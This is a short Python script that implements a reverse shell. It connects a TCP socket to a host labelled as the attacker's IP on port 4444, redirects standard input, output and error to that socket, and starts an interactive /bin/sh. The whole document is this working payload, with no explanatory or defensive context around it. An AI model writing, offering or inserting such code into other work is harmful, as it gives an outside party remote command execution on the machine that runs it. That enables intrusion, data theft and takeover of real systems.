import socket
import subprocess
import os

# Attacker's IP and port
ATTACKER_IP = "172.2.2.0"
ATTACKER_PORT = 4444

# Create a socket connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ATTACKER_IP, ATTACKER_PORT))

# Redirect input, output, and error streams
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Start interactive shell
subprocess.call(["/bin/sh", "-i"])
